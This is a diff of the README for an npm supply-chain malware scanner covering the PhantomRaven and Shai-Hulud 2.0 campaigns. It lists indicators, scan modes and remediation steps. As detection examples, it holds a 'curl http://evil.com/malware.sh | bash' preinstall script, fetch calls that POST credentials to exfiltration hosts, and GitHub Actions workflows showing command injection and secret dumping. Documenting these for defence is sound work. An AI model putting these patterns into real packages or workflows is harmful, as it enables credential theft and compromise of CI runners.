@@ -1,57 +1,43 @@
-# 🛡️ PhantomRaven Hunter
+# 🛡️ npm-threat-hunter
 
-**A comprehensive shell-based scanner for detecting PhantomRaven npm supply chain malware and similar threats.**
+**A comprehensive shell-based scanner for detecting npm supply chain malware including PhantomRaven, Shai-Hulud 2.0, and similar threats.**
 
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
 [![Shell Script](https://img.shields.io/badge/shell-bash-green.svg)](https://www.gnu.org/software/bash/)
-[![Tested on](https://img.shields.io/badge/tested%20on-ubuntu%20|%20debian-blue.svg)](https://github.com/dpr1815/phantomraven-hunter)
+[![Version](https://img.shields.io/badge/version-2.0.0-blue.svg)](https://github.com/paoloanzn/npm-threat-hunter)
 
-## 🚨 What is PhantomRaven?
+## 🚨 Supported Attack Campaigns
 
-PhantomRaven is a sophisticated npm supply chain attack discovered in October 2025 by [Koi Security](https://www.koi.ai/blog/phantomraven-npm-malware-hidden-in-invisible-dependencies). The campaign:
+### 🦅 PhantomRaven (Aug-Oct 2025)
+
+Discovered by [Koi Security](https://www.koi.ai/blog/phantomraven-npm-malware-hidden-in-invisible-dependencies), this campaign:
 
 - Infected **126 malicious npm packages** with over **86,000 downloads**
-- Stole npm tokens, GitHub credentials, and CI/CD secrets from developers worldwide
-- Used **Remote Dynamic Dependencies (RDD)** to hide malicious code from traditional security scanners
+- Stole npm tokens, GitHub credentials, and CI/CD secrets
+- Used **Remote Dynamic Dependencies (RDD)** to hide malicious code
 - Remained undetected from **August to October 2025**
 
-### The RDD Technique
+### 🪱 Shai-Hulud 2.0 (Nov 2025 - ONGOING)
 
-Traditional npm packages specify dependencies like:
+Discovered by [Wiz Research](https://www.wiz.io/blog/shai-hulud-2-0-ongoing-supply-chain-attack), this active campaign:
 
-```json
-"dependencies": {
-  "express": "^4.18.0"
-}
-```
-
-PhantomRaven used HTTP URLs instead:
-
-```json
-"dependencies": {
-  "unused-imports": "http://packages.storeartifact.com/npm/unused-imports"
-}
-```
-
-When installed, npm fetches the malicious package from the attacker's server, completely bypassing security scans. The malicious code never appears in the npm registry.
+- Compromised **350+ maintainer accounts** including Zapier, ENS Domains, PostHog
+- Affected **25,000+ repositories** (growing by ~1,000 every 30 minutes)
+- Exploits **GitHub Actions** with self-hosted runner backdoors
+- Exfiltrates secrets via artifacts and webhook.site
+- Executes during **preinstall phase** for maximum exposure
 
 ## 🎯 Why This Scanner?
 
-Most security tools **failed to detect PhantomRaven** because:
+Most security tools **fail to detect these attacks** because:
 
-1. ❌ They rely on static analysis of the npm registry
-2. ❌ They don't follow HTTP/HTTPS URLs in dependencies
-3. ❌ They don't analyze actual package behavior
-4. ❌ They miss dynamically-fetched payloads
-
-**PhantomRaven Hunter** catches what others miss by:
-
-1. ✅ Detecting Remote Dynamic Dependencies (RDD)
-2. ✅ Identifying all 126 known malicious packages
-3. ✅ Analyzing lifecycle scripts for auto-execution
-4. ✅ Deep-scanning code for credential theft patterns
-5. ✅ Checking installation timing against attack timeline
-6. ✅ Smart whitelisting to reduce false positives
+| Traditional Tools                     | npm-threat-hunter                           |
+| ------------------------------------- | ------------------------------------------- |
+| ❌ Static registry analysis only      | ✅ Detects Remote Dynamic Dependencies      |
+| ❌ Miss HTTP URLs in dependencies     | ✅ Identifies 150+ known malicious packages |
+| ❌ Ignore GitHub Actions threats      | ✅ Scans workflows for injection attacks    |
+| ❌ No version-specific detection      | ✅ Flags exact compromised versions         |
+| ❌ Can't detect exfiltration patterns | ✅ Deep code analysis for credential theft  |
 
 ## 🚀 Quick Start
 
@@ -62,47 +48,47 @@ Most security tools **failed to detect PhantomRaven** because:
 sudo apt install jq  # Ubuntu/Debian
 brew install jq      # macOS
 
-# Verify
-jq --version
-
-# Optional accelerators
-sudo apt install parallel # Ubuntu/Debian
-brew install parallel   # macOS
+# Optional (for faster scans)
+sudo apt install parallel  # Ubuntu/Debian
+brew install parallel      # macOS
 ```
 
 ### Installation
 
 ```bash
 # Clone the repository
-git clone https://github.com/dpr1815/phantomraven-hunter.git
-cd phantomraven-hunter
+git clone https://github.com/paoloanzn/npm-threat-hunter.git
+cd npm-threat-hunter
 
 # Make executable
-chmod +x phantomraven-hunter.sh
+chmod +x npm-threat-hunter.sh
 
 # Run scan
-./phantomraven-hunter.sh /path/to/your/projects
+./npm-threat-hunter.sh /path/to/your/project
 ```
 
-### Usage Modes
+## 📊 Usage Modes
 
-#### 1. Basic Scan (Fast - ~30 seconds)
+### 1. Basic Scan (Fast - ~30 seconds)
 
 ```bash
-./phantomraven-hunter.sh ~/projects
+./npm-threat-hunter.sh ~/projects
 ```
 
-Checks for:
+Detects:
 
-- Remote Dynamic Dependencies
+- Remote Dynamic Dependencies (PhantomRaven)
 - Known malicious packages
+- Compromised package versions (Shai-Hulud 2.0)
+- Shai-Hulud artifact files
+- GitHub Actions workflow injections
 - Suspicious lifecycle scripts
 - Malicious domain references
 
-#### 2. Deep Scan (Recommended - ~2-3 minutes)
+### 2. Deep Scan (Recommended - ~2-3 minutes)
 
 ```bash
-./phantomraven-hunter.sh --deep ~/projects
+./npm-threat-hunter.sh --deep ~/projects
 ```
 
 Additional checks:
@@ -110,122 +96,51 @@ Additional checks:
 - Credential theft patterns in code
 - Suspicious network calls
 - Environment variable harvesting
-- Config file access attempts
+- webhook.site exfiltration detection
 
-#### 3. Paranoid Mode (Maximum - ~5 minutes)
+### 3. Paranoid Mode (Maximum - ~5 minutes)
 
 ```bash
-./phantomraven-hunter.sh --paranoid ~/projects
+./npm-threat-hunter.sh --paranoid ~/projects
 ```
 
 Everything plus:
 
-- Installation timing analysis (Aug-Oct 2025)
-- Package integrity verification
+- Installation timing analysis (attack periods)
 - System compromise indicators
 - ~/.gitconfig and ~/.npmrc forensics
+- GitHub self-hosted runner detection
 
-#### 4. Verbose Mode
-
-```bash
-./phantomraven-hunter.sh --deep --verbose ~/projects
-```
-
-Shows all findings including whitelisted safe packages.
-
-#### 5. JSON & Dry-Run Modes (CI Friendly)
+### 4. All Options
 
 ```bash
-# JSON report you can redirect to a file
-./phantomraven-hunter.sh --deep --json ~/projects > phantomraven-report.json
+./npm-threat-hunter.sh [OPTIONS] [PATH]
 
-# Explore what would be scanned without touching files
-./phantomraven-hunter.sh --dry-run ~/projects
+Options:
+  --deep         Enable deep code scanning
+  --paranoid     Enable all checks including timing analysis
+  --verbose      Show detailed output including whitelisted items
+  --json         Output results in JSON format
+  --dry-run      Show what would be scanned without executing
+  --no-cache     Disable signature caching
+  --parallel     Use parallel processing (requires GNU parallel)
+  --help         Show help message
+  --version      Show version information
 ```
 
-#### 6. Performance / Cache Controls
+Combine flags as needed:
 
 ```bash
-# Force signature reload if you just updated data files
-./phantomraven-hunter.sh --no-cache ~/projects
-
-# Enable GNU parallel for faster deep scans
-./phantomraven-hunter.sh --deep --parallel ~/projects
+./npm-threat-hunter.sh --deep --json --parallel ~/projects > report.json
 ```
 
-You can combine any of the flags above, e.g. `--deep --json --parallel` for a machine-readable deep report at maximum speed.
+## 🔍 Detection Capabilities
 
-## 📊 Understanding Results
+### PhantomRaven Detection
 
-### Exit Codes
+#### Remote Dynamic Dependencies (RDD)
 
-- `0` = Clean (no threats detected)
-- `1` = CRITICAL (malware detected - take immediate action)
-- `2` = WARNING (suspicious indicators found - review carefully)
-
-### Example: Clean System ✅
-
-```
-═══════════════════════════════════════════════════════════
-                    SCAN RESULTS
-═══════════════════════════════════════════════════════════
-
-Summary:
-├─ Remote Dynamic Dependencies: 0
-├─ Known Malicious Packages: 0
-├─ Suspicious Lifecycle Scripts: 3
-├─ Credential Theft Patterns: 0
-└─ Suspicious Network Calls: 0
-
-═══════════════════════════════════════════════════════════
-✓ No critical threats detected
-```
-
-### Example: Malware Detected 🚨
-
-```
-═══════════════════════════════════════════════════════════
-🚨 CRITICAL: Remote Dynamic Dependencies:
-════════════════════════════════════════
-[CRITICAL] unused-imports -> http://packages.storeartifact.com/npm/unused-imports
-  File: project/package.json
-  Status: KNOWN_MALICIOUS_DOMAIN
-
-🚨 CRITICAL: MALWARE DETECTED!
-
-IMMEDIATE ACTIONS REQUIRED:
-1. DO NOT run npm install
-2. Disconnect this machine from network
-3. Rotate ALL credentials immediately
-   - GitHub tokens: https://github.com/settings/tokens
-   - npm tokens: npm token list
-   - CI/CD secrets
-...
-```
-
-## 🔍 What Gets Scanned
-
-The scanner intelligently searches through:
-
-```
-project/
-├── package.json          ✓ RDD & malicious packages
-├── package-lock.json     ✓ Timing analysis
-├── node_modules/
-│   └── */
-│       ├── package.json  ✓ Scripts & dependencies
-│       └── *.js          ✓ Deep code analysis (--deep)
-├── ~/.gitconfig          ✓ System compromise (--paranoid)
-└── ~/.npmrc              ✓ Token exposure (--paranoid)
-```
-
-## 🎓 Detection Capabilities
-
-### 1. Remote Dynamic Dependencies (RDD)
-
-**The Primary Attack Vector**
-
-Detects HTTP/HTTPS URLs in dependencies:
+The primary PhantomRaven attack vector:
 
 ```json
 ❌ MALICIOUS
@@ -239,103 +154,236 @@ Detects HTTP/HTTPS URLs in dependencies:
 }
 ```
 
-### 2. Known Malicious Packages
+#### Known Malicious Packages
 
-All 126 packages from the PhantomRaven campaign:
+All 126 packages from the PhantomRaven campaign including:
 
 - `unused-imports`
 - `eslint-comments`
 - `transform-react-remove-prop-types`
-- `crowdstrike` (fake package, not the real security company!)
+- `crowdstrike` (fake package!)
 - [See full list](data/malicious-packages.txt)
 
-### 3. Lifecycle Script Analysis
+### Shai-Hulud 2.0 Detection
 
-Flags suspicious auto-executing scripts:
+#### Compromised Package Versions
 
-```json
-⚠️ SUSPICIOUS
-"scripts": {
-  "preinstall": "curl http://evil.com/malware.sh | bash"
-}
+Detects exact malicious versions:
 
-✅ SAFE (esbuild - whitelisted)
-"scripts": {
-  "postinstall": "node install.js"
-}
+| Package                     | Compromised Versions   |
+| --------------------------- | ---------------------- |
+| `@zapier/zapier-sdk`        | 0.15.5, 0.15.6, 0.15.7 |
+| `zapier-platform-core`      | 18.0.2, 18.0.3, 18.0.4 |
+| `zapier-platform-cli`       | 18.0.2, 18.0.3, 18.0.4 |
+| `@zapier/mcp-integration`   | 3.0.1, 3.0.2, 3.0.3    |
+| `@ensdomains/ensjs`         | 4.0.3                  |
+| `@ensdomains/ens-contracts` | 1.6.1                  |
+| `ethereum-ens`              | 0.8.1                  |
+| `@posthog/agent`            | 1.24.1                 |
+
+Plus entire compromised namespaces:
+
+- `@trigo/*`
+- `@orbitgtbelgium/*`
+- `@louisle2/*`
+
+#### Shai-Hulud Artifact Files
+
+Detects malware payload files:
+
+| File                  | Purpose                        |
+| --------------------- | ------------------------------ |
+| `setup_bun.js`        | Payload loader                 |
+| `bun_environment.js`  | Environment stealer            |
+| `cloud.json`          | Exfiltrated cloud credentials  |
+| `contents.json`       | Stolen repository contents     |
+| `environment.json`    | Captured environment variables |
+| `truffleSecrets.json` | Harvested secrets              |
+
+#### GitHub Actions Exploitation
+
+Scans workflows for:
+
+```yaml
+# 🚨 BACKDOOR PATTERN - Self-hosted runner with discussion trigger
+name: Discussion Create
+on:
+  discussion:
+jobs:
+  process:
+    runs-on: self-hosted # ← Targets compromised runners
+    steps:
+      - run: echo ${{ github.event.discussion.body }} # ← Command injection!
 ```
 
-### 4. Credential Theft Patterns (--deep)
+```yaml
+# 🚨 SECRET EXFILTRATION - Dumps all secrets
+env:
+  DATA: ${{ toJSON(secrets) }} # ← Enumerates ALL secrets
+steps:
+  - uses: actions/upload-artifact@v5 # ← Exfiltrates via artifacts
+```
+
+Specific patterns detected:
+
+- `discussion.yaml` backdoor workflows
+- `formatter_*.yml` secret exfiltration
+- Self-hosted runner registration as "SHA1HULUD"
+- `toJSON(secrets)` enumeration
+- Unsafe `echo ${{ github.event.* }}` injection
+
+### Deep Scan Features (--deep)
+
+#### Credential Theft Patterns
 
 Searches for:
 
 - `process.env.NPM_TOKEN`
 - `process.env.GITHUB_TOKEN`
-- `.gitconfig` file access
-- `.npmrc` file access
-- `CI_` environment variables
+- `process.env.GH_TOKEN`
+- `process.env.GITLAB_TOKEN`
+- `.gitconfig` / `.npmrc` access
 
-### 5. Network Activity (--deep)
+#### Network Exfiltration
 
 Detects suspicious outbound connections:
 
 ```javascript
-⚠️ FLAGGED
-fetch('http://packages.storeartifact.com/exfil', {
-    method: 'POST',
-    body: JSON.stringify(credentials)
+// 🚨 FLAGGED - Known exfiltration endpoint
+fetch("https://webhook.site/xxx", {
+  method: "POST",
+  body: JSON.stringify(secrets),
 });
 ```
 
-### 6. Timeline Analysis (--paranoid)
+### Paranoid Mode Features (--paranoid)
 
-Checks if packages were installed during PhantomRaven's active period:
+#### Timeline Analysis
 
-- **August 1, 2025 - October 31, 2025**
+Flags packages installed during active attack periods:
 
-### 7. System Forensics (--paranoid)
+- **PhantomRaven**: August 1 - October 31, 2025
+- **Shai-Hulud 2.0**: November 21 - present, 2025
 
-- Checks `~/.gitconfig` modification time
+#### System Forensics
+
+- Checks `~/.gitconfig` modification timestamps
 - Validates `~/.npmrc` for exposed tokens
 - Scans environment for leaked secrets
+- Detects GitHub self-hosted runners named "SHA1HULUD"
 
-## 🛠️ Advanced Usage
+## 📊 Understanding Results
 
-### Scan Multiple Projects
+### Exit Codes
 
-```bash
-for dir in ~/projects/*/; do
-    echo "Scanning $dir"
-    ./phantomraven-hunter.sh --deep "$dir"
-done
+| Code | Status      | Action                                       |
+| ---- | ----------- | -------------------------------------------- |
+| `0`  | ✅ Clean    | No threats detected                          |
+| `1`  | 🚨 CRITICAL | Malware detected - immediate action required |
+| `2`  | ⚠️ WARNING  | Suspicious indicators - review carefully     |
+
+### Example: Clean System
+
+```
+═══════════════════════════════════════════════════════════
+                    SCAN RESULTS
+═══════════════════════════════════════════════════════════
+
+Summary:
+├─ Remote Dynamic Dependencies: 0
+├─ Known Malicious Packages: 0
+├─ Compromised Versions: 0
+├─ Shai-Hulud Artifacts: 0
+├─ Workflow Injections: 0
+├─ Suspicious Lifecycle Scripts: 2
+├─ Credential Theft Patterns: 0
+└─ Suspicious Network Calls: 0
+
+═══════════════════════════════════════════════════════════
+✓ No critical threats detected
+
+Your npm projects appear clean based on known indicators for:
+  - PhantomRaven (Aug-Oct 2025)
+  - Shai-Hulud 2.0 (Nov 2025+)
 ```
 
-### Save Report to File
+### Example: Shai-Hulud 2.0 Detected
 
-```bash
-./phantomraven-hunter.sh --paranoid ~/projects 2>&1 | tee report.txt
+```
+═══════════════════════════════════════════════════════════
+🪱 Compromised Package Versions:
+════════════════════════════════════════
+[CRITICAL] @zapier/zapier-sdk@0.15.6
+  File: project/package.json
+  Campaign: SHAI_HULUD_2
+
+🪱 GitHub Actions Workflow Issues:
+════════════════════════════════════════
+[CRITICAL] discussion+self-hosted
+  File: .github/workflows/discussion.yaml
+  Issue: Backdoor pattern
+
+═══════════════════════════════════════════════════════════
+🚨 CRITICAL: MALWARE DETECTED!
+
+Campaign Detected: SHAI-HULUD 2.0
+
+IMMEDIATE ACTIONS REQUIRED:
+1. DO NOT run npm install
+2. Disconnect this machine from network
+3. Rotate ALL credentials immediately
+...
+
+SHAI-HULUD 2.0 SPECIFIC ACTIONS:
+6. Check GitHub for self-hosted runners named 'SHA1HULUD'
+7. Review .github/workflows for discussion.yaml or formatter_*.yml
+8. Audit GitHub Discussions for suspicious content
+9. Check for exfiltration to webhook.site
+10. Review Actions artifacts for secret dumps
 ```
 
-### CI/CD Integration
+## 🛠️ CI/CD Integration
+
+### GitHub Actions
 
 ```yaml
-# .github/workflows/security.yml
-name: PhantomRaven Scan
+name: Security Scan
 on: [push, pull_request]
 
 jobs:
-  security-scan:
+  npm-threat-scan:
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v3
+      - uses: actions/checkout@v4
 
       - name: Install jq
         run: sudo apt-get install -y jq
 
-      - name: Run PhantomRaven Hunter
+      - name: Run npm-threat-hunter
         run: |
-          chmod +x phantomraven-hunter.sh
-          ./phantomraven-hunter.sh --deep .
+          chmod +x npm-threat-hunter.sh
+          ./npm-threat-hunter.sh --deep .
+
+      - name: Upload report
+        if: failure()
+        uses: actions/upload-artifact@v4
+        with:
+          name: threat-scan-report
+          path: scan-report.json
+```
+
+### GitLab CI
+
+```yaml
+npm-threat-scan:
+  stage: test
+  image: ubuntu:latest
+  before_script:
+    - apt-get update && apt-get install -y jq
+  script:
+    - chmod +x npm-threat-hunter.sh
+    - ./npm-threat-hunter.sh --deep .
+  allow_failure: false
 ```
 
 ### Pre-commit Hook
@@ -345,58 +393,84 @@ jobs:
 # .git/hooks/pre-commit
 
 if [ -f "package.json" ]; then
-    ./phantomraven-hunter.sh --deep . || exit 1
+    ./npm-threat-hunter.sh --deep . || exit 1
 fi
 ```
 
-## 🧪 Testing
-
-### Run Test Suite
+### Scan Multiple Projects
 
 ```bash
-cd tests/
-./run_tests.sh
+for dir in ~/projects/*/; do
+    echo "Scanning $dir"
+    ./npm-threat-hunter.sh --deep "$dir"
+done
 ```
 
-## 🔒 Security Best Practices
+## 🔒 Immediate Remediation
 
 ### If Malware IS Detected
 
-1. **Immediate Isolation**
+#### 1. Isolate Immediately
 
-   ```bash
-   # Disconnect from network
-   sudo ip link set eth0 down
-   ```
+```bash
+# Disconnect from network
+sudo ip link set eth0 down  # Linux
+sudo ifconfig en0 down      # macOS
+```
 
-2. **Check What Was Stolen**
+#### 2. Check What Was Stolen
 
-   ```bash
-   cat ~/.gitconfig
-   cat ~/.npmrc
-   env | grep TOKEN
-   ```
+```bash
+cat ~/.gitconfig
+cat ~/.npmrc
+env | grep -E '(TOKEN|SECRET|KEY|PASSWORD)'
+```
 
-3. **Rotate ALL Credentials**
+#### 3. Rotate ALL Credentials
 
-   - GitHub: https://github.com/settings/tokens
-   - npm: `npm token list` && `npm token revoke <id>`
-   - CI/CD: Update all secrets in GitHub Actions, GitLab CI, etc.
+| Service | Action                                          |
+| ------- | ----------------------------------------------- |
+| GitHub  | https://github.com/settings/tokens → Revoke all |
+| npm     | `npm token list` → `npm token revoke <id>`      |
+| CI/CD   | Update all secrets in Actions/GitLab/Jenkins    |
+| Cloud   | Rotate AWS/GCP/Azure credentials                |
 
-4. **Clean Rebuild**
+#### 4. Clean Rebuild
 
-   ```bashs
-   # Remove all node_modules
-   find ~/projects -name "node_modules" -type d -exec rm -rf {} +
+```bash
+# Clear npm cache
+npm cache clean --force
 
-   # Remove lock files
-   find ~/projects -name "package-lock.json" -delete
+# Remove all node_modules
+rm -rf node_modules
+find ~/projects -name "node_modules" -type d -exec rm -rf {} +
 
-   # Reinstall safely
-   npm install --ignore-scripts
-   ```
+# Remove lock files
+rm package-lock.json
 
-### Prevention
+# Reinstall with scripts disabled
+npm install --ignore-scripts
+
+# Pin to safe versions (pre-Nov 21, 2025 for Shai-Hulud affected packages)
+```
+
+#### 5. Shai-Hulud Specific Cleanup
+
+```bash
+# Check for malicious self-hosted runners
+gh api user/repos --jq '.[].full_name' | while read repo; do
+  gh api "repos/$repo/actions/runners" 2>/dev/null | grep -q "SHA1HULUD" && echo "INFECTED: $repo"
+done
+
+# Remove malicious workflows
+rm -f .github/workflows/discussion.yaml
+rm -f .github/workflows/formatter_*.yml
+
+# Check for artifact exfiltration
+gh run list --json databaseId,name | jq '.[] | select(.name | contains("format"))'
+```
+
+### Prevention Best Practices
 
 ```bash
 # 1. Use lock files with integrity checks
@@ -406,17 +480,60 @@ npm ci  # instead of npm install
 echo "ignore-scripts=true" >> ~/.npmrc
 
 # 3. Regular scanning
-./phantomraven-hunter.sh --deep ~/projects
+./npm-threat-hunter.sh --deep ~/projects
 
 # 4. Audit before adding packages
 npm audit
 npm view <package-name> dependencies
 
 # 5. Verify AI-suggested packages
-# Never blindly trust GitHub Copilot or ChatGPT package recommendations
+# Never blindly trust Copilot/ChatGPT package recommendations
+
+# 6. Use scoped, short-lived tokens
+# Never use long-lived PATs in CI/CD
 ```
 
-## 📝 False Positives
+## 📁 Data Files
+
+The scanner uses external data files in `data/`:
+
+```
+data/
+├── malicious-packages.txt   # Known malicious npm packages (150+)
+├── malicious-domains.txt    # C2 and exfiltration domains
+├── safe-domains.txt         # Whitelisted domains for RDD
+├── safe-packages.txt        # Packages with legitimate install scripts
+└── ioc-artifacts.txt        # IOC patterns (files, workflows, versions)
+```
+
+### Updating Signatures
+
+Simply edit the text files to add new IOCs:
+
+```bash
+# Add new malicious package
+echo "new-malicious-pkg" >> data/malicious-packages.txt
+
+# Add new malicious domain
+echo "evil-domain.com" >> data/malicious-domains.txt
+
+# Force reload (bypass cache)
+./npm-threat-hunter.sh --no-cache ~/projects
+```
+
+### IOC Artifact Format
+
+```
+TYPE|PATTERN|DESCRIPTION|CAMPAIGN
+
+Examples:
+FILE|setup_bun.js|Shai-Hulud payload loader|SHAI_HULUD_2
+WORKFLOW|discussion.yaml|Backdoor workflow|SHAI_HULUD_2
+VERSION|@zapier/zapier-sdk|0.15.5,0.15.6,0.15.7|SHAI_HULUD_2
+NAMESPACE|@trigo/|Compromised publisher|SHAI_HULUD_2
+```
+
+## 🧪 False Positives
 
 The scanner intelligently whitelists known-safe patterns:
 
@@ -433,48 +550,47 @@ The scanner intelligently whitelists known-safe patterns:
 - `cypress`, `puppeteer`, `playwright` - Testing frameworks
 - `electron` - Desktop app framework
 
-### Your Scan Had False Positives?
+### Handling False Positives
 
-**Example from a real scan:**
+Add to whitelist files:
 
+```bash
+# Safe domain
+echo "your-internal-registry.com" >> data/safe-domains.txt
+
+# Safe package with install scripts
+echo "your-internal-package" >> data/safe-packages.txt
 ```
-Package: test262
-URL: https://github.com/tc39/test262#commit-hash
-```
-
-**Verdict:** ✅ SAFE - GitHub reference from official TC39 JavaScript test suite
 
 ## 🤝 Contributing
 
-Contributions welcome! Please:
+Contributions welcome!
 
 1. Fork the repository
 2. Create a feature branch
 3. Add tests for new detections
 4. Submit a pull request
 
-### Adding New Malware Signatures
+### Adding New Campaign Support
 
-Edit the arrays in `phantomraven-hunter.sh`:
-
-```bash
-MALICIOUS_DOMAINS=(
-    "packages.storeartifact.com"
-    "your-new-domain.com"  # Add here
-)
-
-MALICIOUS_PACKAGES=(
-    "unused-imports"
-    "your-new-package"  # Add here
-)
-```
+1. Add packages to `data/malicious-packages.txt`
+2. Add domains to `data/malicious-domains.txt`
+3. Add IOCs to `data/ioc-artifacts.txt`
+4. Update detection functions if new techniques needed
 
 ## 📚 Resources
 
-- [Original Koi Security Report](https://www.koi.ai/blog/phantomraven-npm-malware-hidden-in-invisible-dependencies)
-- [Dark Reading Coverage](https://www.darkreading.com/application-security/malicious-npm-packages-invisible-dependencies)
-- [The Hacker News](https://thehackernews.com/2025/10/phantomraven-malware-found-in-126-npm.html)
+### Attack Research
+
+- [Shai-Hulud 2.0 - Wiz Blog](https://www.wiz.io/blog/shai-hulud-2-0-ongoing-supply-chain-attack)
+- [PhantomRaven - Koi Security](https://www.koi.ai/blog/phantomraven-npm-malware-hidden-in-invisible-dependencies)
+- [Aikido Security Analysis](https://www.aikido.dev/blog/cutting-through-the-noise-what-packages-were-actually-compromised-by-the-polyfill-attack)
+
+### Security Best Practices
+
 - [npm Security Best Practices](https://docs.npmjs.com/security-best-practices)
+- [GitHub Actions Security Hardening](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
+- [Socket.dev - Supply Chain Security](https://socket.dev/blog)
 
 ## ⚖️ License
 
@@ -486,18 +602,19 @@ This tool is provided for defensive security purposes only. Use responsibly and 
 
 ## 🙏 Credits
 
-- **Koi Security** - For discovering PhantomRaven and publishing detailed IOCs
-- **Oren Yomtov** - Lead researcher on the PhantomRaven campaign
+- **Wiz Research** - For discovering Shai-Hulud 2.0 and rapid disclosure
+- **Koi Security & Oren Yomtov** - For the original PhantomRaven research
+- **Aikido Security** - For additional analysis and confirmation
 - **npm Security Team** - For rapid response in removing malicious packages
 - **Open Source Community** - For maintaining secure package ecosystems
 
 ## 📞 Support
 
-- **Issues**: [GitHub Issues](https://github.com/dpr1815/phantomraven-hunter/issues)
-- **Security**: Report vulnerabilities privately to [security@email.com]
+- **Issues**: [GitHub Issues](https://github.com/paoloanzn/npm-threat-hunter/issues)
+- **Security**: Report vulnerabilities privately via GitHub Security Advisories
 
 ---
 
 **Stay safe! Scan often. Trust but verify.** 🛡️
 
-Last updated: November 2025
+_Last updated: December 2025 | Version 2.0.0_
